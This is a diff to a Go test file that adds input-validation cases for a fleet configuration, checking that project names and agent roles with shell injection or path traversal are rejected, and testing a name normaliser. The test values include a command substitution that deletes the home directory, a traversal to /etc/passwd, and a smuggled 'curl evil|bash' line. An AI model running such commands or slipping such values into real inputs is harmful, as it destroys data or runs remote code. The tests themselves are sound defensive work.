@@ -112,6 +112,38 @@ func TestValidate(t *testing.T) {
 			},
 			wantErr: "at least one agent is required",
 		},
+		{
+			name: "project name with shell metacharacters (command injection)",
+			cfg: FleetConfig{
+				Project: ProjectConfig{Name: "$(rm -rf ~)", Cwd: "/tmp"},
+				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "Dev"}},
+			},
+			wantErr: "invalid project name",
+		},
+		{
+			name: "project name path traversal",
+			cfg: FleetConfig{
+				Project: ProjectConfig{Name: "../../etc/passwd", Cwd: "/tmp"},
+				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "Dev"}},
+			},
+			wantErr: "invalid project name",
+		},
+		{
+			name: "role with shell injection",
+			cfg: FleetConfig{
+				Project: ProjectConfig{Name: "proj", Cwd: "/tmp"},
+				Agents:  []AgentConfig{{Name: "dev", Color: "green", Role: "x'; curl evil|bash; '"}},
+			},
+			wantErr: "invalid role",
+		},
+		{
+			name: "role with slash is allowed (CI/CD)",
+			cfg: FleetConfig{
+				Project: ProjectConfig{Name: "proj", Cwd: "/tmp"},
+				Agents:  []AgentConfig{{Name: "ops", Color: "green", Role: "CI/CD and deployment"}},
+			},
+			wantErr: "",
+		},
 	}
 
 	for _, tt := range tests {
@@ -129,6 +161,30 @@ func TestValidate(t *testing.T) {
 				}
 			}
 		})
+	}
+}
+
+func TestNormalizeProjectName(t *testing.T) {
+	tests := []struct {
+		in   string
+		want string
+	}{
+		{"site.com", "site-com"},
+		{"My App", "My-App"},
+		{"clean-name_1", "clean-name_1"},
+		{"weird$(x)", "weird--x"},
+		{"_leading", "leading"},
+		{"trailing-", "trailing"},
+	}
+	for _, tc := range tests {
+		got := NormalizeProjectName(tc.in)
+		if got != tc.want {
+			t.Errorf("NormalizeProjectName(%q) = %q, want %q", tc.in, got, tc.want)
+		}
+		// A normalized name must always satisfy the Validate() guard.
+		if got != "" && !validName.MatchString(got) {
+			t.Errorf("NormalizeProjectName(%q) = %q which fails validName", tc.in, got)
+		}
 	}
 }
 
